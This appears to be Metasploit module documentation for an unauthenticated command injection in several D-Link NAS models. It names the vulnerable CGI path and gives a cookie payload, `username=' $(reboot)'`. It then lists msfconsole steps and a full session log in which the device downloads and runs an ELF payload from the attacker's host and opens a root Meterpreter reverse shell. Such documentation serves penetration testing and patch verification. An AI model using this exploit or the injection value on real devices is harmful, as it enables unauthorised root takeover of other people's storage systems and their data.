This module exploits an unauthenticated OS command injection vulneralbility to execute arbitrary commands on the operating system. The vulnerable file is `/cgi-bin/system_mgr.cgi` is within the username value of a cookie. Any arbitrary command can be executed  within the username field in a cookie like the following : `username=' $(reboot)'`will reboot the device.

## Vulnerable Application
D-LINK DNR-326 v.1.40b03, DNS-327 v.1.02, DNS-320L v.1.03 and DNS-320 revision a, v.2.03

## Verification Steps
  1. Start msfconsole
  2. Do : `use exploit/linux/http/dlink_multi_system_mgr_unauth_exec`
  3. Do : `set RHOST [RouterIP]`
  4. Do : `set PAYLOAD [payload]`
  5. Do : `run`
  6. If device is vulnerable, payload should be dropped via wget and executed, and therein obtain an session

## Scenarious
If vulnerable router, output should be similiar to this
```
msf > use exploit/linux/http/dlink_multi_system_mgr_unauth_exec
msf exploit(dlink_multi_system_mgr_unauth_exec) > set RHOST 192.168.0.14
RHOST => 192.168.0.14
msf exploit(dlink_multi_system_mgr_unauth_exec) > set LHOST ens3
LHOST => ens3
msf exploit(dlink_multi_system_mgr_unauth_exec) > set LPORT 31533
LPORT => 31533
msf exploit(dlink_multi_system_mgr_unauth_exec) > run
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.0.11:31533
[*] 192.168.0.14:80 - Connecting to target...
msf exploit(dlink_multi_system_mgr_unauth_exec) > [*] 192.168.0.14:80 - Starting up web service http://192.168.0.11:8080/rLdzhCCcJOztcjm
[*] Using URL: http://0.0.0.0:8080/rLdzhCCcJOztcjm
[*] Local IP: http://192.168.0.11:8080/rLdzhCCcJOztcjm
[*] 192.168.0.14:80 - Asking target to request to download http://192.168.0.11:8080/rLdzhCCcJOztcjm
[*] 192.168.0.14:80 - Sending payload to the server...
[*] 192.168.0.14:80 - Waiting for target to request the ELF payload...
[*] 192.168.0.14:80 - Requesting device to chmod rLdzhCCcJOztcjm
[*] 192.168.0.14:80 - Requesting device to execute rLdzhCCcJOztcjm
[*] Sending stage (782120 bytes) to 192.168.0.14
[*] Meterpreter session 1 opened (192.168.0.11:31533 -> 192.168.0.14:38321) at 2017-10-26 12:29:26 -0400
[+] Deleted /tmp/hupkkwbx
[-] Exploit aborted due to failure: unknown: 192.168.0.14:80 - Unable to deploy payload
[*] Server stopped.
ls
[*] exec: ls

dlink_dnr326_system_mgr_unauth_exec.rb
msf exploit(dlink_multi_system_mgr_unauth_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                    Connection
  --  ----  ----                     -----------                                    ----------
  1         meterpreter armle/linux  uid=0, gid=0, euid=0, egid=0 @ 192.168.10.220  192.168.0.11:31533 -> 192.168.0.14:38321 (192.168.0.14)

msf exploit(dlink_multi_system_mgr_unauth_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : 192.168.0.14
OS           :  (Linux 2.6.31.8)
Architecture : armv5tel
Meterpreter  : armle/linux
meterpreter >
```
